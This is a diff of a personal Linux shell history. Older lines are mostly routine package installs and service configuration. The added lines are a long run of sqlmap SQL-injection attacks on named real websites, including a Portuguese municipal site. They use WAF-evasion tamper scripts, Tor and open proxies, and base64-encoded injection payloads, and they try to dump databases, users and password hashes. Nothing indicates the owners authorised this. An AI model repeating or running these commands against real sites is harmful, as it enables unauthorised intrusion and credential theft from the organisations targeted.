- sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=YToyOntzOjQ6Im1lbnUiO3M6MzoiY2FtIjtzOjU6ImFjY2FvIjtzOjEyOiJmb19wZXNxdWlzYXIiO30="  --data="keywords=" --dbs --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
-sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=YToyOntzOjQ6Im1lbnUiO3M6MzoiY2FtIjtzOjU6ImFjY2FvIjtzOjEyOiJmb19wZXNxdWlzYXIiO30="  --data "keywords=#1*" --dbs --random-agent
-sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=YToyOntzOjQ6Im1lbnUiO3M6MzoiY2FtIjtzOjU6ImFjY2FvIjtzOjEyOiJmb19wZXNxdWlzYXIiO30="  --data "keywords=#1*" --dbs --random-agent --level 3 --risk 3
-sqlmap -u "http://www.cm-tabuaco.pt/index.php?info={encode|base64} 
-sqlmap -u "http://www.cm-tabuaco.pt/index.php?info={encode|base64} 1 
-sqlmap -u "http://www.cm-tabuaco.pt/index.php?info={encode|base64}" 1 
-sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=YToyOntzOjQ6Im1lbnUiO3M6MzoiY2FtIjtzOjU6ImFjY2FvIjtzOjEyOiJmb19wZXNxdWlzYXIiO30="  --data "keywords=ola"
-sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=YToyOntzOjQ6Im1lbnUiO3M6MzoiY2FtIjtzOjU6ImFjY2FvIjtzOjEyOiJmb19wZXNxdWlzYXIiO30="  --data "keywords=#1*" --random-agent --level 5 --risk 3 --threads 10 --dbms mysql --dbs --technique B
-sqlmap --help
-sudo pacman -S gnome-screenshoot
-sudo pacman -S gnome-screenshot
-
-startweb 
-systemctl status mysqld
-systemctl status httpd
-whereis libphp7.so
-sudo pacman -S php7
-sudo pacman -S php
-ls /etc/httpd/modules
-systemctl status httpd
-sudo pacman -R php
-yaourt php56
-history
-sudo nano /etc/pacman.d/gnupg/gpg.conf 
-yaourt php56
-history
-yaourt php56
-gpg -r C2BF0BC433CFC8B3
-gpg --keyserver pool.sks-keyservers.net --recv-keys C2BF0BC433CFC8B3
-yaourt -S php56
-istory
-history
-ls /etc/httpd/modules
-ls -l /etc/httpd/modules
-ls /usr/lib/modules
-ls /usr/lib/httpd/modules/
-subl3 /etc/httpd/conf/httpd.conf 
-ls /usr/lib/httpd/modules/
-sudo subl3 /etc/httpd/conf/httpd.conf 
-sudo /etc/httpd/conf/extra/
-ls /etc/httpd/conf/extra/
-sudo subl3 /etc/httpd/conf/httpd.conf 
-sudo systemctl restart httpd
-sudo systemctl status httpd
-sudo systemctl restart httpd
-sudo systemctl status httpd
-sudo subl3 /etc/httpd/conf/httpd.conf 
-sudo systemctl restart httpd
-sudo subl3 /etc/httpd/conf/httpd.conf 
-sudo systemctl status httpd
-sudo nano /srv/index.php
-sudo chown http /srv/index.php 
-sudo chown http:http /srv/index.php 
-cp /srv/index.php /srv/http/index.php
-sudo cp /srv/index.php /srv/http/index.php
-sudo pacman -S alsamixer
-sudo pacman -Ss alsamixer
-sudo pacman -S gnome-alsamixer
-gnome-alsamixer 
-sudo pacman -S python-simplejson
-sudo -s
-yaourt qdis
-yaourt qgis
-git clone https://github.com/3liz/lizmap-web-client.git
-sudo cp -R lizmap/ /srv/http/
-ls /srv/http/
-cd /srv/http/lizmap/
-ls
-cd lizmap/install/
-php 
-php56 
-php56 installer.php 
-sudo php56 installer.php 
-cd ..
-cd var/config/
-cp profiles.ini.php.dist profiles.ini.php
-sudo cp profiles.ini.php.dist profiles.ini.php
-sudo php56 installer.php 
-cd ..
-cd install/
-sudo php56 installer.php 
-cd
-cd /srv/http/
-cd lizmap/ 
-sudo chown :http temp/ lizmap/var/ lizmap/www/ lizmap/install/qgis/edition/ -R
-chmod 775 temp/ lizmap/var/ lizmap/www/ lizmap/install/qgis/edition/
-sudo chmod 775 temp/ lizmap/var/ lizmap/www/ lizmap/install/qgis/edition/
-ls
-lizmap/install/set_rights.sh http http
-sudo lizmap/install/set_rights.sh http http
-sudo pulseaudio --start
-sudo pacman -S pulseaudio
-sudo pacman -S pulseaudio-alsa
-sudo pacman -S alsa-utils
-alsamixer 
-alsa-info.sh 
-cd transmission-277+-cfp-git-MOD/web-client-mod/
-ls -l
-cd web/
-ls -l
-cd /usr/share/transmission/web_backup/
-cd javascript/
-ls -l
-cd ..
-ls -l
-cd images/
-ls
-cd ..
-cd javascript/
-ls
-cd ..
-cd style/
-ls
-ls transmission/
-cd..
-ls transmission/
-cd ..
-cd ../wev
-cd ../web
-sudo chmod 755 advanced/style/jqueryui/ advanced/style/transmission/ experimental/javascript/jquery/ experimental/style/jqueryui/ experimental/style/transmission/
-sudo chmod 755 advanced/javascript/jquery/
-sudo chmod 755 advanced/style/jqueryui/images/
-sudo chmod 755 advanced/style/transmission/images/
-sudo chmod 755 experimental/style/jqueryui/images/
-sudo chmod 755 experimental/style/transmission/images/
-sudo chmod 755 groups/javascript/jquery/
-tree
-sudo find /usr/share/transmission/web -type d -exec chmod 755 {} \;
-cd
-cd Downloads/
-sudo chown :transmission Transmission/
-ls -l
-yaourt transmission
-cd 
-cd transmission-2.77/
-sudo make install
-ls
-cd web/
-ls
-sudo make install
-ls
-cd ..
-sudo cp -r web/ /usr/share/transmission/web/
-yaourt transmission
-sudo pacman -Ss transmission
-svn co svn://svn.transmissionbt.com/Transmission/trunk Transmission
-sudo pacman -S svn
-svn co svn://svn.transmissionbt.com/Transmission/trunk Transmission
-wget http://download-origin.transmissionbt.com/files/transmission-2.77.tar.bz2
-tar xjf transmission-2.77.tar.bz2 
-cd transmission-2.77
-ls
-CFLAGS="-Os -march=native" ./configure && make && checkinstall
-./install-sh 
-checkinstall
-makeinstall
-make install
-sudo make install
-transmission-gtk 
-transmission-cli 
-transmission-gtk 
-sudo pacman -R transmission-gtk.spec
-sudo pacman -R transmission
-whereis transmission-gtk.spec
-whereis transmission-gtk
-sudo pacman -S transmission
-sudo pacman -S transmission-gtk.spec
-sudo pacman -Ss transmission-gtk
-sudo pacman -S transmission-gtk
-make unninstall
-make unninstall-am
-sudo make uninstall
-cd
-transmission-gtk 
-sudo pacman -S transmission-gtk
-transmission-gtk 
-sudo cp ~/.gtkrc-2.0 /root/.gtkrc-2.0
-sudo systemctl start transmission
-sudo systemctl enable transmission.service
-sudo pacman -Ss transmission
-sudo pacman -S transmission-cli
-transmission-cli 
-ls -l /usr/local/bin/
-transmission-create 
-transmission-cli
-sudo pacman -Rs transmission-2.77
-sudo pacman -Rs transmission
-rm -r transmission-2.77
-sudo pacman -Rs transmission
-sudo pacman -Qs transmission
-sudo pacman -Rs transmission-cli transmission-gtk
-sudo pacman -S transmission
-sudo pacman -S transmission-cli
-transmission-cli 
-systemctl start transmission
-transmission-cli 
-transmission-cli
-startweb 
-whereis transmission
-whereis transmission-cli
-cd /usr/share/transmission/
-ls
-ls web/
-sudo ls web/
-sudo mv -R web/ web_backup
-sudo mv web/ web_backup
-ls
-sudo cp -r /home/emanuelx/transmission-277+-cfp-git-MOD/web-client-mod/web/ web/
-ls
-ls web
-ls web/
-ls -l
-sudo chmod 733 web
-ls -l
-sudo chmod 755 web
-ls -l
-cd web_backup/
-ls -l
-cd ../web/
-ls -l
-sudo chmod 775 javascript/
-sudo chmod 775 style/
-sudo chmod 775 shifttq/ images groups experimental
-sudo chmod 775 advanced
-ls -l
-sudo chmod 755 advanced
-sudo chmod 755 shifttq/ images groups experimental
-ls -l
-sudo chmod 755 style/ javascript/
-cd javascript/
-ls
-s -l
-ls -l
-sudo chmod 755 jquery/
-cd ..
-ls
-ls advanced
-cd advanced
-ls -l
-sudo chmod 755 images javascript/style
-sudo chmod 755 images javascript style
-cd ..
-cd experimental
-ls
-sudo chmod 755 images javascript style
-cd ..
-ls
-cd groups
-ls
-sudo chmod 755 images javascript style
-cd ..
-ls
-cd shifttq/
-ls
-cd ..
-cd style/
-ls
-sudo chmod 755 jqueryui/ transmission/
-cd ..
-cd javascript/
-ls
-ls .l
-ls -l
-cd ..
-ls
-cd style/
-ls
-cd transmission/
-ls .l
-ls -l
-sudo chmod 755 images
-cd ..
-ls
-tree
-sudo pacman -S tree
-tree
-sudo chmod 755 transmission/images/buttons/
-sudo chmod 755 jqueryui/images/
-cd ..
-tree
-cd
-sudo -s
-cd transmission-2.77/
-ls
-CFLAGS="-Os -march=native" ./configure && make && checkinstall
-sudo make install
-transmission-cli 
-systemctl start transmission
-cd 
-ls -l
-cd transmission-277+-cfp-git-MOD/web-client-mod/
-sudo rm -r /usr/share/transmission/web_backup/
-sudo mv /usr/share/transmission/web/ /usr/share/transmission/web_backup
-ls /usr/share/transmission/
-sudo cp -r web/ /usr/share/transmission/web
-ls
-cd /usr/share/transmission/
-ls
-ls web
-history
-find /usr/share/transmission/ -type d -exec chmod 755 {} \;
-sudo find /usr/share/transmission/ -type d -exec chmod 755 {} \;
-systemctl start transmission
-sudo systemctl daemon-reload
-sudo systemctl start transmission
-sudo systemctl enable transmission
-transmission-daemon 
-ls
-sudo mv web web_novo
-s
-ls
-sudo mv web_backup/ web/
-ls
-ls web
-ls -l
-ls -l web/
-sudo rm -r web/
-ls -l
-ls
-ls -l
-ls
-tree
-sudo subl3 /etc/httpd/conf/httpd.conf 
-journalctl -f
-transmission-daemon 
-cd /usr/share/transmission/
-ls
-sudo mv web web_backup
-ls
-sudo web_novo/ web/
-sudo mv web_novo/ web/
-ls
-sudo rm -r web
-ls
-sudo cp -r /home/emanuelx/transmission-277+-cfp-git-MOD/web-client-mod/web/ web/
-ls
-ls web
-sudo find /usr/share/transmission/ -type d -exec chmod 755 {} \;
-ls /opt/
-sudo mv web web_novo
-ls
-whereis transmission-daemon
-ls /usr/local/share/transmission/
-sudo rm -r /usr/share/transmission/
-cd /usr/local/share/transmission/
-sudo mv web/ web_novo
-sudo cp -r /home/emanuelx/transmission-277+-cfp-git-MOD/web-client-mod/web/ web/
-sudo find /usr/local/share/transmission/ -type d -exec chmod 755 {} \;
-ls
-pkill firefox
-pkill transmission-daemon 
-cd
-cd transmission-2.77/
-ls
-make unninstall-am
-make uninstall-am
-sudo make uninstall-am
-sudo pacman -Qs transmission
-sudo make uninstall-am
-sudo make uninstall
-cd ../Downloads/transmission_1.91b-1_i386
-ls
-sudo cp -r ./usr/ /usr/
-sudo rm /usr/usr/
-sudo ls /usr/usr/
-sudo rm -rf /usr/usr/
-sudo cp -r ./usr/ /usr/*
-sudo cp -r ./usr/* /usr/*
-sudo cp -r ./usr/* /usr/
-sudo cp -r ./usr/local/ /usr/
-sudo cp -r ./usr/local/bin/* /usr/local/bin/
-sudo cp -r ./usr/local/share/applications/* /usr/local/share/applications/
-sudo cp -r ./usr/local/share/icons/* /usr/local/share/icons/
-sudo cp -r ./usr/local/share/locale/ /usr/local/share/locale/
-transmission
-sudo pamcan -S libcanberra
-sudo pamcan -Ss libcanberra
-sudo pamcan -Ss libcanberra-gtk
-sudo pacman -Ss libcanberra-gtk
-sudo pacman -Ss libcanberra
-transmission
-whereis libcanberra-gtk
-sudo rm /usr/local/bin/transmission
-sudo rm /usr/local/bin/transmission-daemon 
-sudo rm /usr/local/bin/transmission-remote 
-sudo rm -rf /usr/local/share/transmission/
-sudo rm -rf /usr/local/share/applications/transmission.desktop 
-transmissioncli 
-whereis transmissioncli 
-sudo rm transmissioncli 
-sudo rm /usr/local/bin/transmissioncli 
-cd transmission-2.77/
-sudo make install
-cd 
-sudo find /home/emanuelx/transmission-277+-cfp-git-MOD/web-client-mod/ -type d -exec chmod 755 {} \;
-sudo mv /usr/local/share/transmission/web/ /usr/local/share/transmission/web_old
-sudp cp -r ~/transmission-277+-cfp-git-MOD/web-client-mod/web/ /usr/local/share/transmission/web
-sudo cp -r ~/transmission-277+-cfp-git-MOD/web-client-mod/web/ /usr/local/share/transmission/web
-transmission-daemon 
-whereis settings.json
-pkill transmission-daemon 
-sudo pacman -Ss java
-yaourt java
-sudo pacman -Ss java
-sudo pacman -Ss jdk
-sudo pacman -Ss jdk8-openjdk
-java -jar 
-java -jar ~/vuse/Azureus
-java -jar ~/vuse/Azureus2.jar 
-sudo pacman -S vuse
-sudo pacman -Ss vuse
-yaourt -Ss vuse
-yaourt -S vuse
-yaourt -S vuze
-vuze 
-java -jar ~/vuse/Azureus2.jar 
-whereis vuse
-whereis vuze
-ls -l /usr/bin/vuze
-ls -l /opt/
-sudo mv /opt/vuze/Azureus2.jar /opt/vuze/Azureus2.jar.bak 
-sudo cp -r ~/vuse/* /opt/vuze/
-ls /opt/vuze/
-vuze
-sudp vuze
-sudo vuze
-sudo nano /usr/share/applications/vuze.desktop 
-sudo nano /usr/share/applications/firefox.desktop 
-sudo nano /usr/share/applications/vuze.desktop 
-vuze 
-sudo ls /opt/vuze/
-sudo ls -l /opt/vuze/
-sudo chown :vuze /opt/vuze/
-sudo chown emanuelx: /opt/vuze/
-sudo ls -l /opt/vuze/
-sudo chown -R emanuelx: /opt/vuze/
-sudo ls -l /opt/vuze/
-cd transmission-2.77/
-sudo make uninstall
-sudo systemctl disable transmission
-top
-cd
-ps -aux | grep transmisison
-ps -aux | grep trans
-kill -9 1662
-ps -aux | grep trans
-exi
-exit
-ssh emanuelx@192.168.1.50
-vuze --ui=console
-java -jar /opt/vuze/Azureus2.jar --ui=console
-quit
-exit
-ssh 192.168.1.50
-ls Vuze\ Downloads/
-ssh 192.168.1.50
-lspci -nn | grep -i audio
-lspci -nn
-vuze 
-sudo pacman -S tigervnc
-systemctl avahi
-systemctl start avahi
-systemctl start avahi-server
-pulseaudio --kill
-rm -rf ~/.pulse*
-pulseaudio --start
-alsamixer 
-sudo nano /etc/modprobe.d/alsa-base.conf 
-sudo pacman -R vuze
-yaourt vuze
-vuze-extreme-mod 
-ssh 192.168.1.50
-ls -l /opt/vuze
-vuze-extreme-mod 
-ls /opt/vuze
-ls -l /opt/vuze
-vuze-extreme-mod 
-vuze-extreme-mod 1> vuze.txt
-subl3 vuze.txt 
-sudo pacman -Ss wt
-sudo pacman -Ss swt
-sudo pacman -Ss libswt
-sudo pacman -Ss tribler
-yaourt -Ss tribler
-yaourt -S tribler
-swt
-vuze-extreme-mod 
-ls /opt/vuze
-whereis vuze.txt 
-whereis vuze
-nano /usr/bin/vuze-extreme-mod 
-sudo pacman -Ss adb
-yaourt -Ss adb
-yaourt android-sdk-platform-tools
-adb
-sudo pacman -R android-sdk-platform-tools
-sudo pacman -R android-sdk-platform-tools-dummy
-sudo pacman -S android-tools
-adb
-fastboot devices
-sudo -s
-sudo pacman -Ss mono
-sudo pacman -S mono
-ssh 192.168.1.50
-sudo pacman -S paprefs
-paprefs 
-sudo pacman -Rs paprefs
-sudo pacman -S pavucontrol
-pavucontrol 
-sudo pacman -S alsa-plugins
-ls /opt/
-pacman -Qs vuze
-sudo pacman -Rs vuze-extreme-mod
-ls /opt/
-sudo rm -rf /opt/vuze/
-ls /opt/sqlmap/
-sudo pacman -S wireshark
-sudo pacman -Ss wireshark
-sudo pacman -S wireshark-gtk
-sudo wireshark
-sudo wireshark-gtk
-sudo gpasswd -a emanuelx wireshark
-groups
-wireshark-gtk 
-sudo wireshark-gtk 
-wireshark-gtk 
-getcap /usr/bin/dumpcap 
-wireshark
-sudo -g wireshark wireshark-gtk
-groups wireshark
-groups emanuelx
-groups
-sudo nano /etc/sudoers
-wireshark-gtk 
-sudo usermod -a -G wireshark emanuelx
-groups emanuelx
-groups
-sudo setcap cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap
-getcap /usr/bin/dumpcap 
-wireshark-gtk 
-sudo chmod 755 /usr/bin/dumpcap 
-wireshark-gtk 
-sudo pacman -Ss arduino
-yaourt -S arduino
-sudo pacman -Syu
-telnet 192.168
-telnet 192.168.1.60
-telnet 192.168.1.64:8082
-telnet 192.168.1.64 8082
-tail -f /dev/ttyUSB0 
-pkill telnet
-sudo -s
-ps -aux wine
-ps -aux | grep wine
-ps -aux | grep RMP
-pkill RMP
-fastboot devices
-sudo -s
-wget http://6c83.vd.aclst.com/dl.php/7pFLWY03ABo/Sativa+-+Moinho.mp3?video_id=7pFLWY03ABo&t=N3BGTFdZMDNBQm8tMzE1OTQyMTE0NS0xNDcwMTQwMjExLTY2NTk3MQ%3D%3D&exp=05-08-2016&s=2d24938af4c18fbbdba8d6c31bc6c3b0
-ssh 192.168.1.50
-rm  ~/.config/spotify/window_position.prefs 
-sudo pacman -S winetriks
-sudo pacman -S winetricks
-winetricks 
-WINEARCH=win32 WINEPREFIX=~/win32 winecfg
-rm -rf ~/.wine/
-WINEARCH=win32 WINEPREFIX=~/.wine winecfg
-winetricks 
-pkill telnet
-cat /dev/ttyUSB1 
-telnet 192.168.1.64
-telnet 192.168.1.64 8082
-ssh 192.168.1.50
-cd Documents/
-ls
-git clone https://github.com/marzika/Snapprefs.git
-exit
-ssh 192.168.1.0
-ssh 192.168.1.50
-sudo pacman -Ss android
-yaourt anrdroid-studio
-yaourt android
-yaourt android-studio
-git clone https://github.com/TheZ3ro/apk2java-linux.git
-ssh 192.168.1.50
-sudo -s
-yaourt mobilemediaconverter
-yaourt converter
-yaourt winff
-winff 
-sudo pacman -Rs winff 
-sudo pacman -S handbrake
-sudo pacman -Rs handbrake
-sudo pacman -Syu
-sudo loadkeys pt-latin9
-cat /var/log/slim.log 
-startx
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" --tables 
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" -D cmtabuac_db --tables 
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" --dbs --tables --schema --count --comments --hostname -U 
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" -a -hex
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" --dbs --tables --schema --count --comments --hostname --hex
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" --dbs --schema --count --comments --hostname --hex
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" --dbs --tables -C -T
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" --dbs --tables -C -T --no-cast
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" -D cmtabuac_db2
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" -D cmtabuac_db2 --tables
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" -D cmtabuac_db2 --tables -T -C --no-cast
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" -D cmtabuac_db2 --tables -T -C --no-cast -v3
+subl /usr/share/sqlmap/tamper/cmt_test.py 
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" -D cmtabuac_db2 --tables -T -C --no-cast -v3
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" --dbs --tables -T -C --no-cast -v3
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" --dbs --tables -T -C -v3 --level 2 --technique B
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" --dbs --tables -T -C -v3 --level 2 --technique E
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" --dbs --tables -T -C -v3 --level 2 --technique U
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" --dbs --tables -T -C -v3 --level 3
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" --dbs --tables -v3 --level 4
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" --dbs --tables -v3 --level=5 --random-agent --banner --risk=3
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" --dbs --tables -v3 --level=5 --random-agent --banner --risk=3 --hex
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" --dbs --tables -v3 --level=5 --random-agent --banner --risk=3 --hex--parse-errors
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" --dbs --tables -v3 --level=5 --random-agent --banner --risk=3 --hex --parse-errors
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" --dbs --tables -v3 --level=4 --risk=3 --random-agent --banner --hex --parse-errors
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" --dbs --tables -v3 --level=6 --risk=6 --random-agent --banner --hex --parse-errors
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" --dbs --tables -v3 --level=5 --risk=6 --random-agent --banner --hex --parse-errors
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" --dbs --tables -v3 --level=5 --risk=3 --random-agent --banner --hex --parse-errors
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py,between,randomcase,space2comment" --dbs --tables -v3 --random-agent --hex --identify-waf
+echo "YTozOntzOjQ6Im1lbnUiO3M6MzoiY2FtIjtzOjU6ImFjY2FvIjtzOjEyOiJub3RpY2lhc19sZXIiO3M6MjoiaWQiO3M6MzY3OiInIC8qITMwOTA2QU5EIChTRUxFQ1QgMTI3MCBGUk9NKFNFTEVDVCBDT1VOVCgqKSxDT05DQVQoMHg3MTdhNmE3MDcxLChTRUxFQ1QgSUZOVUxMKENBU1QoQ09VTlQoKikgQVMgQ0hBUiksMHgyMCkgRlJPTSBJTkZPUk1BVElPTl9TQ0hFTUEuVEFCTEVTIFdIRVJFIHRhYmxlX3NjaGVtYSBJTiAoMHg2MzZkNzQ2MTYyNzU2MTYzNWY2NDYyLDB4NjM2ZDc0NjE2Mjc1NjE2MzVmNjQ2MjMyLDB4Njk2ZTY2NmY3MjZkNjE3NDY5NmY2ZTVmNzM2MzY4NjU2ZDYxKSksMHg3MTcwNzE3MDcxLEZMT09SKFJBTkQoMCkqMikpeCBGUk9NIElORk9STUFUSU9OX1NDSEVNQS5DSEFSQUNURVJfU0VUUyBHUk9VUCBCWSB4KWEpIEFORCAnWEhuUScgTElLRSAnWEhuUSovIjt9" | base64 -d
+echo "YTozOntzOjQ6Im1lbnUiO3M6MzoiY2FtIjtzOjU6ImFjY2FvIjtzOjEyOiJub3RpY2lhc19sZXIiO3M6MjoiaWQiO3M6MTE0OiJqc29kPTI4MTEgQU5EIDE9MSBVTklPTiBBTEwgU0VMRUNUIDEsMiwzLHRhYmxlX25hbWUgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIFdIRVJFIDI+MS0tIC4uLy4uLy4uL2V0Yy9wYXNzd2QiO30="
+echo "YTozOntzOjQ6Im1lbnUiO3M6MzoiY2FtIjtzOjU6ImFjY2FvIjtzOjEyOiJub3RpY2lhc19sZXIiO3M6MjoiaWQiO3M6MTE0OiJqc29kPTI4MTEgQU5EIDE9MSBVTklPTiBBTEwgU0VMRUNUIDEsMiwzLHRhYmxlX25hbWUgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIFdIRVJFIDI+MS0tIC4uLy4uLy4uL2V0Yy9wYXNzd2QiO30=" | base64 -d
+sqlmap --help 
+subl /usr/share/sqlmap/tamper/cmt_test.py 
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py,between,randomcase,space2comment" --tables -v3 --random-agent --hex --identify-waf
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="between,randomcase,space2comment,cmt_test.py" --tables -v3 --random-agent
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="between,randomcase,space2morehash.py,cmt_test.py" --tables -v3 --random-agent
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="randomcase,cmt_test.py" --tables -v3 --random-agent
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="randomcase" --tables -v3 --random-agent
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_tesrandomcase" --tables -v3 --random-agent
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="randomcase,cmt_test.py" --tables -v3 --random-agent
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="between,randomcase,space2comment,cmt_test.py" --tables -v3 --random-agent
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="unionalltounion,randomcase,space2morehash,cmt_test.py" --tables -v3 --random-agent
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="unionalltounion,lowercase,cmt_test.py" --tables -v3 --random-agent
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="randomcomments,cmt_test.py" --tables -v3 --random-agent
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="randomcomments,cmt_test.py" --tables -v3 --random-agent --prefix "')" --suffix "AND ('abc'='abc"
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" --tables -v3 --random-agent
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" --tables -v3 --random-agent --parse-errors
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" --tables -v3 --random-agent --parse-errors -t ~/teste_cm.txt
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py,between" --tables -v3 --random-agent --parse-errors -t ~/teste_cm.txt
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="chardoubleencode,equaltolike,cmt_test.py" --tables -v3 --random-agent --parse-errors -t ~/teste_cm.txt
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="equaltolike,cmt_test.py" --tables -v3 --random-agent --parse-errors -t ~/teste_cm.txt
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="equaltolike,modsecurityversioned,cmt_test.py" --tables -v3 --random-agent --parse-errors -t ~/teste_cm.txt
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py" -v3 --random-agent
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py, space2randomblank" -v3 --random-agent
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py, space2mysqldash" -v3 --random-agent
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py, space2mysqldash, unionalltounion" -v3 --random-agent
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py, space2mysqldash, randomcase" -v3 --random-agent
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py, space2mysqldash, randomcase,apostrophemask" -v3 --random-agent
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py, space2mysqldash, randomcase, apostrophenullencode" -v3 --random-agent
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py, space2mysqldash, randomcase, bluecoat.py" -v3 --random-agent
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py, space2mysqldash, randomcase,  chardoubleencode.py" -v3 --random-agent
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py, space2mysqldash, randomcase, charencode.py" -v3 --random-agent
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py, randomcase, commalesslimit.py" -v3 --random-agent
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py, randomcase, commalessmid" -v3 --random-agent
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py, randomcase, concat2concatws.py" -v3 --random-agent
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py, randomcase, escapequotes.py" -v3 --random-agent
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=" --tamper="cmt_test.py, randomcase, informationschemacomment.py" -v3 --random-agent
+sqlmap -u "http://www.supra.pt/?section=submodule&sub=display&submodule_id=3" -v3 --random-agent --tor
+sqlmap -u "http://www.supra.pt/?section=submodule&sub=display&submodule_id=3" -v3 --random-agent --proxy=120.52.73.98:80 -o -b --current-user --is-dba
+sqlmap -u "http://www.supra.pt/?section=submodule&sub=display&submodule_id=3" -v3 --random-agent --proxy=http://120.52.73.98:80 -o -b --current-user --is-dba
+sqlmap -u "http://www.supra.pt/?section=submodule&sub=display&submodule_id=3" --random-agent --proxy=http://120.52.73.98:80 --dbs -o -b --current-user --is-dba
+sqlmap -u "http://www.supra.pt/?section=submodule&sub=display&submodule_id=3" --random-agent --proxy=http://120.52.73.98:80 --dbs -o -b --current-user --password
+sqlmap -u "http://www.supra.pt/?section=submodule&sub=display&submodule_id=3" --random-agent --proxy=http://120.52.73.98:80 --dbs -o -b --users --current-user --password
+sqlmap -u "http://www.supra.pt/?section=submodule&sub=display&submodule_id=3" --random-agent --proxy=http://120.52.73.98:80 --dbs -o -b --users --passwords --current-user --password
